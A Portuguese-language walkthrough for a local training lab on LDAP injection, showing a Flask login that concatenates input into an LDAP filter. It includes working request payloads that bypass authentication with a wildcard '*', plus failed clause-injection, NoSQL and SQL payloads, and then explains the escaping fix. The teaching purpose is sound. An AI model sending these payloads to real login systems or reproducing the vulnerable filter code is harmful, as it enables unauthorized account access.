# Walkthrough — ldap-injection

## 1. Contexto

A app é uma API de login corporativo. Você faz `POST /login` com um `user` e um `password`, e o servidor os autentica contra um **diretório LDAP** — um banco hierárquico de identidades (pense em OpenLDAP ou Active Directory, a espinha dorsal dos logins corporativos). Ele monta um **filtro de busca** e considera você autenticado se a busca retorna pelo menos uma entrada:

```
(&(uid=<user>)(userPassword=<password>))
```

Alguns termos, porque o exploit inteiro vive neles:

- Um diretório guarda entradas, cada uma nomeada por um **DN** (Distinguished Name) — um caminho único como `uid=jdoe,ou=people,dc=example,dc=com`. As entradas têm **atributos**: `uid` (o nome de login), `cn` (nome completo), `ou`/`dc` (componentes de organização/domínio), `userPassword`.
- Um **filtro de busca** (RFC 4515) é a string que diz *quais* entradas casar. Ele usa **notação de prefixo**: `(&(A)(B))` é "A **E** B", `(|(A)(B))` é "A **OU** B", `(!(A))` é "**NÃO** A". Um filtro válido é exatamente uma expressão balanceada no topo.
- Os caracteres `*`, `(`, `)` e `\` são **metacaracteres** — *sintaxe* do filtro, não dado. `*` é um **curinga**: sozinho, `(userPassword=*)` é um teste de *presença* — "a entrada tem um `userPassword`", qualquer valor.

Então o filtro acima significa "casa a entrada cujo `uid` é _user_ **e** cujo `userPassword` é _password_." Isto é **LDAP injection**, sob **A03 — Injection** no OWASP Top 10: input não-confiável chegando num interpretador de query — aqui o motor de filtro do diretório — que o trata como estrutura, não como dado inerte. Como a app cola o seu input direto na string do filtro, um metacaractere que você manda é lido como lógica do filtro.

Topologia: um diretório `ldap` compartilhado (sem porta no host) mais `vulnerable` em `127.0.0.1:8028` e `fixed` em `127.0.0.1:8128`. Isto é uma **API — não há trilha browser.** Toda request abaixo é um bloco que você cola no **Burp Repeater**; as mesmas requests rodam no `curl`. A prova é a própria resposta do login.

## 2. Achar o bug

Abra o [`vulnerable/app.py`](./vulnerable/app.py). A view de login é curta:

```python
@app.route("/login", methods=["POST"])
def login():
    body = request.get_json(silent=True) or {}
    user = body.get("user", "")
    password = body.get("password", "")
    # VULNERABLE: user/password are concatenated straight into the LDAP filter...
    filt = f"(&(uid={user})(userPassword={password}))"
    print("LDAP search filter:", filt, flush=True)
    conn = Connection(server, BIND_DN, BIND_PW, auto_bind=True)
    conn.search(PEOPLE_DN, filt, search_scope=SUBTREE, attributes=["uid"])
    if conn.entries:
        return jsonify({"authenticated": True, "uid": str(conn.entries[0].uid)})
    return jsonify({"authenticated": False}), 401
```

O filtro é montado com uma f-string, e `user`/`password` vêm direto do corpo da request. Duas coisas saltam. Primeiro, a decisão de auth é `if conn.entries` — "a busca retornou algo, então você entrou" — que nunca checa uma senha, ela checa se um *filtro casou*. Segundo, o valor que você controla é colado numa string que tem *sintaxe*. Faça a pergunta do auditor: *esse `password` que EU controlo cai dentro de um filtro — e se eu mandar um metacaractere no lugar de um valor?* Aí ele vira estrutura do filtro.

(A app imprime o filtro que monta, então você pode ver no que o seu input se transforma: `docker compose logs vulnerable`.)

## 3. Exploração via Burp Suite

Aponte o Burp para a API vulnerable em `127.0.0.1:8028` e trabalhe no Repeater. As senhas semeadas estão visíveis no [`ldap/seed.ldif`](./ldap/seed.ldif), então o baseline pode usar uma real; o ataque não vai precisar.

### Baseline — o login funcionando normalmente

Uma credencial real em string autentica:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8028
Content-Type: application/json

{"user": "admin", "password": "s3cr3t-admin-pw"}
```

Resposta — `200`:

```json
{"authenticated": true, "uid": "admin"}
```

A app montou exatamente o que você esperaria, e casou:

```
(&(uid=admin)(userPassword=s3cr3t-admin-pw))
```

Uma senha errada não casa nada e é rejeitada — `{"user": "admin", "password": "wrongpw"}` retorna `401 {"authenticated": false}`. Guarde isso: com valores string reais, o filtro são duas igualdades literais, e a da senha tem que estar certa.

### Passo 1 — Mandar um metacaractere no lugar da senha

No lugar da string de senha, mande o único caractere `*`:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8028
Content-Type: application/json

{"user": "admin", "password": "*"}
```

Resposta — `200`:

```json
{"authenticated": true, "uid": "admin"}
```

Você logou como `admin` sem a senha. O filtro que a app de fato rodou foi:

```
(&(uid=admin)(userPassword=*))
```

`*` numa posição de valor não é o caractere literal "estrela" — é o **curinga** do LDAP, e `(userPassword=*)` é um teste de **presença**: "a entrada tem *qualquer* `userPassword`." Como o `admin` tem um, o filtro casa, a busca retorna a entrada, e o `if conn.entries` chama você de autenticado. A checagem de senha não *falhou* — o `*` a *reescreveu*, de "é igual a este valor" para "existe, ponto".

Você pode fixar qualquer conta pondo o curinga nos dois campos. `{"user": "*", "password": "*"}` monta `(&(uid=*)(userPassword=*))`, casa todo usuário, e loga você como o primeiro que o diretório retorna:

```json
{"authenticated": true, "uid": "jdoe"}
```

O lab é isolado — os apps bindam em `127.0.0.1` e o container `ldap` não tem porta no host nenhuma — e o payload é benigno: ele só subverte um `search` para provar o bypass, sem escrever nem modificar nada no diretório. Os usuários semeados são fake.

## 4. O que a vuln NÃO é

O exploit é um caractere, e isso pode te empurrar para o fix errado. Mate as conclusões erradas.

**Não é um bug de validação de "caractere estranho".** O instinto é "é só proibir `*` e parênteses no campo `user`." Isso é uma blocklist, e blocklists perseguem a *forma* do ataque — encodings alternativos, metacaracteres que você não listou, campos que legitimamente contêm símbolos. A causa não é o atacante ter digitado `*`; é a app ter concatenado um valor não-confiável no filtro *como estrutura*. O fix é **escapar** os metacaracteres no ponto de uso, para que nenhum caractere do input seja jamais lido como sintaxe (§6).

**Não é o NoSQL injection do `nosql-injection-mongo` (22).** Os dois são A03 injection numa query-language que não é SQL, mas o motor e o mecanismo diferem. Lá, o input mudava de *tipo* — um objeto JSON `{"$ne": null}` contrabandeava um operador do Mongo — e o fix era forçar o tipo. Aqui o input continua uma string; é um *metacaractere dentro de um filtro concatenado*. Prove a diferença mandando o payload do Mongo como senha:

```
{"user": "admin", "password": {"$ne": null}}
```

Ele falha (`401`). O `ldap3` recebe um valor, renderiza-o no filtro como o texto literal `(&(uid=admin)(userPassword={'$ne': None}))`, e busca uma senha igual a essa string; não há motor de operador `$` para interpretar. O reflexo do SQL também falha — `{"user": "admin", "password": "' OR 1=1 --"}` também retorna `401`, porque não há comando SQL entre aspas para quebrar, só uma senha literal que não casa com ninguém. E note que o **fix se inverte** entre os dois átomos: escapar é exatamente certo *aqui*, mas era o fix *errado* para a confusão de tipo do 22.

**Você não consegue injetar cláusulas de filtro arbitrárias aqui.** O movimento clássico de LDAP injection é reabrir parênteses e enxertar um `OR` — `{"user": "*)(uid=*))(|(uid=*", "password": "x"}`. Tente e a app retorna `500`: o `ldap3` monta `(&(uid=*)(uid=*))(|(uid=*)(userPassword=x))`, vê dois filtros no topo, e recusa com `LDAPInvalidFilterError: missing boolean operator in filter`. O `ldap3` exige um único filtro bem-formado, então o vetor que funciona aqui é um metacaractere na *posição de valor* — o curinga `*` — não estrutura enxertada.

**Não é RCE.** Ele subverte a query do diretório para bypassar a autenticação; nada executa código.

**A prova de isolamento.** Um login real com credenciais corretas e sem metacaracteres se comporta *identicamente* nas duas portas (`200`, `uid: admin`); uma credencial errada é `401` nos dois. Só o payload de metacaractere separa o app vulnerable (`200`) do fixed (`401`).

## 5. Impacto

Bypass de autenticação — você loga como `admin` sem credencial, o que dá acesso a tudo que o `admin` alcança no contexto da vítima. É o mesmo teto de um bypass de auth via SQL injection (`sqli-union-basic` subverte uma query SQL para o mesmo fim; este subverte um filtro LDAP), alcançado por um motor diferente. Não é RCE. LDAP injection tem outras faces no mundo real — manipular um filtro para ler de volta atributos que a query nunca deveria expor — mas este átomo modela a face de bypass de auth e não afirma mais que isso.

## 6. Por que o fix funciona

Rode as mesmas requests contra a API fixed na porta **8128** (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) para a mudança).

O payload `*` é rejeitado:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8128
Content-Type: application/json

{"user": "admin", "password": "*"}
```

Resposta — `401`:

```json
{"authenticated": false}
```

A app fixed rodou:

```
(&(uid=admin)(userPassword=\2a))
```

O `escape_filter_chars` transformou o `*` no seu escape da RFC 4515 `\2a` — o caractere literal, não mais um curinga. O filtro agora busca uma conta cujo `userPassword` seja exatamente a string de um caractere `*`, que ninguém tem, então a busca não retorna nada e o login é recusado. Um `(`, `)` ou `\` escapado é neutralizado do mesmo jeito (`\28`, `\29`, `\5c`).

E a feature fica intacta: a credencial real em string (`{"user": "admin", "password": "s3cr3t-admin-pw"}`) ainda retorna `200` na 8128, exatamente como no app vulnerable — o valor dela não tem metacaracteres, então escapar não muda nada. A feature é idêntica; só o payload de metacaractere separa os dois. O fix **escapa o input** — ele não coloca caracteres numa blocklist, e não troca o desenho frágil "a busca casou, então você entrou" por um **bind** de verdade (conectar ao diretório como o próprio DN daquele usuário com a senha fornecida, que é como a auth de diretório deveria ser checada). O [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) percorre por que essas alternativas têm a forma errada.
